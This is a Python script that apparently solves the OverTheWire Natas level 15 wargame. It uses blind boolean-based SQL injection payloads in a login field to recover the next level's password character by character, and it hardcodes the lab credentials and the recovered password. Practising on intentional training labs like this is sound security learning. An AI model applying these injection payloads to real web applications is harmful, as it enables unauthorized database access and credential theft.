import requests
import string
import time

start = time.time()
requests_count = 0

url = 'http://natas15.natas.labs.overthewire.org/index.php?debug'
natas15_username = 'natas15'
natas15_password = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'

s = requests.Session() 
s.auth = (natas15_username, natas15_password)

# the previous level passwords were composed of ascii letters(lowercase and uppercase) and digits
charset = string.digits + string.ascii_letters 
new_charset = ''
for char in charset:
    # check is the password contains this character
    # use the BINARY keyword to force a case-sensitive comparison
    data = {'username': f'natas16" AND password LIKE BINARY "%{char}%";-- '}
    r = s.post(url, data=data)
    requests_count += 1
    if 'exists' in r.text:
        new_charset += char
print(repr(new_charset))
       
password = ''
while True:
    for char in new_charset:
        # use the BINARY keyword to force a case-sensitive comparison
        data = {'username': f'natas16" and password LIKE BINARY "{password+char}%";-- '}
        r = s.post(url, data=data)
        requests_count += 1
        if 'exists' in r.text:
            password += char
            print(len(password), password)
            break
    else:
        print('done')
        break


# password = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'
end = time.time()
print(f'took {end-start} seconds')
print('requests sent:', requests_count)